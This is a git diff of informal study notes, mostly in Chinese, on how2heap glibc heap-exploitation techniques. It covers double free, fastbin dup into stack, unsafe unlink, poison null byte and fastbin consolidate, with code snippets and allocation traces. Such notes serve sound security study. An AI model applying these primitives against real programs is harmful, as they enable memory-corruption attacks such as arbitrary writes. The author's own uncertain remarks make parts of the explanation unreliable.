@@ -1,7 +1,19 @@
 # Reference:
 https://github.com/shellphish/how2heap/tree/master
 https://www.giantbranch.cn/2017/09/29/how2heap%E5%AD%A6%E4%B9%A0/
-# 1.0 first-fit
+
+first fit -> 只是一个structure
+fastbin_dup -> double free 的感觉
+fastbin_dup_into_stack 2.23 ->  可以用double free 改 return address 为 stack 上面的位置
+fastbin_dup_into_stack 2.32 ->  填满 7 次 然后再 free 完
+unsafe_unlink 2.23 -> free触发的unlink，以获得任意stack地址value的写能力 0x80
+unsafe_unlink 2.32 -> big enough not to use tcache 0x420
+tcache_poisoning >2.25 ->
+unsorted_bin_attack.c < 2.29 -> 
+unsorted_bin_into_stack.c < 2.29 -> 
+
+# 🔰 第一阶段：基础知识与简单技巧（建议熟悉 glibc 2.27-2.29）
+## 1.0 first-fit
 不是 攻击 只是一个structure 概念 
 ```
 char* a = malloc(0x512);
@@ -20,7 +32,7 @@ free A -> [0x5567377d6420]
 -> []
 ```
 
-# 2.0 fastbin_dup
+## 2.0 fastbin_dup
 double free 的感觉
 ```
 int *a = calloc(1, 8);
@@ -52,7 +64,9 @@ free(a) -> [0x5565d7d0b420,0x5565d7d0b440,0x5565d7d0b420]
 -> []
 ```
 
-# 3.0 fastbin_dup_into_stack 2.23 no tcache
+
+## 3.0 fastbin_dup_into_stack
+### 3.1 fastbin_dup_into_stack 2.23 no tcache
 如果要改 libc 版本
 ```shell
 改 version
@@ -109,7 +123,7 @@ stack = 0x20 :  0x7ffd22f86028 STACK
 4th malloc(8): 0x7ffd22f86030 <- 控制的地方是这里
 ```
 
-# 4.0 fastbin_dup_into_stack 2.39 with tcache
+### 3.2 fastbin_dup_into_stack 2.39 with tcache
 with tcache 就有一点不同
 需要先填满 tcache 
 就是先 填满 7 次 然后再 free 完
@@ -164,7 +178,9 @@ question:
 
 challenge:
 怎样利用？
-# 5.0 unsafe_unlink 2.23 no tcache
+
+## 4.0 unsafe_unlink
+### 4.1 unsafe_unlink 2.23 no tcache
 
 free触发的unlink，以获得任意stack地址value的写能力
 ```
@@ -311,7 +327,7 @@ challenge:
 可以任意写
 可以改free got = put got = 任意读
 
-# 6.0 unsafe_unlink 2.32 with tcache
+### 4.2 unsafe_unlink 2.32 with tcache
 区别
 ```
 为什么 0x420 //we want to be big enough not to use tcache or fastbin
@@ -364,3 +380,195 @@ fake chunk 起始处离真实 chunk 起始偏移了 0x10 字节 ??????????
 
 这样就可以
 fake_chunk.size == chunk1_hdr[0] = 0x420;
+
+
+
+## 5.0 poison_null_byte
+### 5.1 poison_null_byte.c 2.23 no tcache
+可以用在 存在一个单字节溢出漏洞 然后可以改 malloc 里的chunk value
+```
+a = malloc(0x100)
+b = malloc(0x200)
+c = malloc(0x100)
+
+barrier = malloc(0x100) <- c not consolidate with top chunk when freed
+
+*(b+0x1f0) = 0x200 <- pass 'chunksize(P) != prev_size (next_chunk(P))'
+free(b)
+
+a[real_a_size] = 0;
+
+b2 = malloc(0x100)
+b2 = malloc(0x80)
+
+memset(b2,'B',0x80);
+
+free(b1)
+free(c)
+
+d = malloc(0x300)
+
+memset(d,'D',0x300)
+
+b2 = DDDDDDDDDDDD
+```
+
+大概过一下 在做什么？
+malloc 3 个 chunk
+```
+a 0x100 -> real size 0x108
+b 0x100
+c 0x100
+```
+要pass 一个checking
+```
+*(b+0x1f0) = 0x200 <- pass 'chunksize(P) != prev_size (next_chunk(P))'
+free b -> b 被丢进了 unsorted bin。
+
+现在没有b 了 记住他现在的size 是 
+b.size: 0x211
+b.size is: (0x200 + 0x10) | prev_in_use
+```
+
+然后我要overflow a 1 single null byte 写到 b
+```
+a[0x108] = b size 为什么要做这个?
+b.size: 0x200
+
+c_prev_size_ptr = c - 2
+现在c 的prev size 是 0x210
+
+bypass 的是 
+chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))
+chunksize(P) == b-0x8 == b-0x10+b-0x8 == prev_size (next_chunk(P))
+
+具体在
+// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
+// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
+// next_chunk(P) == b-0x10+0x200 == b+0x1f0
+// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
+```
+准备完了 开始做事
+```
+b1 = malloc(0x100) -> 伪造 size 成功后，malloc 一个和 b 一样大小的 chunk
+此时 b1 分配到了原来 b 的位置，也就是我们拿回了 b
+这个时候 c 的prev size 不是 0x210
+b1 = 0x55fa695f9120
+
+b2 = malloc(0x80); 
+这个 b2 被放在 b1 的后面，而且b2整个块也仍然在原来b的内部 仍在 c 的前面
+memset(b2,'B',0x80)
+b2 = 0x55fa695f9230: BBBBBBBBBBBBBBBBBBB <- victim
+
+c =  0x55fa695f9330
+
+free(b1);
+free(c);
+
+正常情况下，b1 和 b2 是两个独立 chunk，但由于我们之前 伪造了 b 的 size（减小了大小)
+就是 should be 
+a
+b1 <- 这个Free 
+b2 <- 被忘记了
+c
+
+free 的时候，glibc 认为 b1 和 c 是连续的 chunk，于是把它们合并了，但错误地跳过了 b2
+a
+xxx
+b2 <- 被忘记了
+c
+
+d = malloc(0x300);
+覆盖到原来的 b1+c 的位置
+d == b1 + c
+
+memset(d, 'D', 0x300);  // 写 D 到 d 的内存范围
+a
+d  DDDDDDDDDDDDDDDDDD
+b2 DDDDDDDDDDDDDDDDDD
+c
+```
+### 5.2 poison_null_byte.c 2.32 with tcache
+
+FCKK 这个太难了 ....
+经典堆溢出技巧，利用 null byte 改变 chunk size。
+
+| 对比项           | 第一个程序                    | 第二个程序                              |
+| ------------- | ------------------------ | ---------------------------------- |
+| 依赖 glibc 版本   | 旧版（2.23）                 | 新版（2.31）                           |
+| 使用技术          | unlink + off-by-null     | largebin attack + off-by-null      |
+| fake chunk 构造 | 没有（直接劫持 size）            | 有（通过 prev chunk 的 metadata）        |
+| 利用复杂度         | 适合初学者理解                  | 更高阶、更真实的场景模拟                       |
+| glibc 检查绕过方式  | 修改 prev_size(next_chunk) | 控制 fd/bk + fd_nextsize/bk_nextsize |
+
+## 6.0 fastbin_dup_consolidate 
+
+### 2.23 no tcache
+他的作用是 如果malloc够大 进 可以一直玩 free malloc 会拿到 一样的address
+顺序是 0x40 0x400 free 0x400 free 0x400
+```
+p1 = calloc(1,0x40)
+free(p1)
+
+p3 = malloc(0x400)
+
+free(p1)
+
+p4 = malloc(0x400)
+```
+
+过程
+```
+p1 = calloc(1,0x40) 0x55bd9ce0d420
+free(p1) 
+[p1]
+
+To trigger malloc_consolidate malloc with large chunk size (>= 0x400)
+p3 = malloc(0x400) 0x55bd9ce0d420
+[]
+
+p1 == p3
+
+现在我要double free p1 但是 p3 hasn't been freed
+free(p1)
+[p1]
+
+再来 malloc
+p4 = malloc(0x400) 0x55bd9ce0d420
+[]
+
+这个做到一个很神奇的东西
+p3=0x55bd9ce0d420 p4=0x55bd9ce0d420
+both point to the same large-sized chunk
+```
+
+### 2.32 with tcache
+
+区别是 fill up tcache 7 次
+```
+void *ptr[7];
+
+for(int i = 0; i < 7; i++)
+	ptr[i] = malloc(0x40);
+
+void* p1 = malloc(0x40); 0x56301ae5f8e0
+printf("Allocate another chunk of the same size p1=%p \n", p1);
+
+printf("Fill up the tcache...\n");
+for(int i = 0; i < 7; i++)
+	free(ptr[i]);
+
+free(p1);
+
+CHUNK_SIZE 0x400
+p2 = malloc(CHUNK_SIZE); 0x56301ae5f8e0
+
+free p1
+
+p3 = malloc(CHUNK_SIZE); 0x56301ae5f8e0
+
+p2 == p3
+```
+## 6.0 tcache_poisoning
+
+
